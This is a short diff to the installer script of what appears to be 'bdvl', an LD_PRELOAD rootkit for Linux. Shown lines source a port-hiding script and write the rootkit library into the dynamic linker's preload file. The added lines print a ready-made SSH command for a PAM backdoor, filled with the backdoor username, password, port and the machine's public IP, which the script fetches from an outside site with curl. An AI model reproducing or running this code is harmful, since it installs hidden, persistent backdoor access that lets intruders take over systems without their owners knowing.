@@ -41,7 +41,7 @@ source ./etc/hideports.sh
 # (IT'S SLOW AS HELL!!!!)
 source ./etc/settings.sh
 
-# what it sounds like. read for more info.
+# prepares our environment.
 source ./etc/postinstall.sh
 
 compile_bdvl(){
@@ -129,6 +129,9 @@ install_bdvl(){
     echo -n "$SOPATH" > $LDSO_PRELOAD
     secho "Installation complete!"
     cleanup_bdvl
+
+    [ `toggle_enabled "USE_PAM_BD"` == 'true' ] && \
+        echo -e "\n\t\e[32mbash etc/ssh.sh $BD_UNAME `curl -s wtfismyip.com/text` $PAM_PORT # $BD_PWD\e[0m\n"
 }
 
 VERBOSE=0
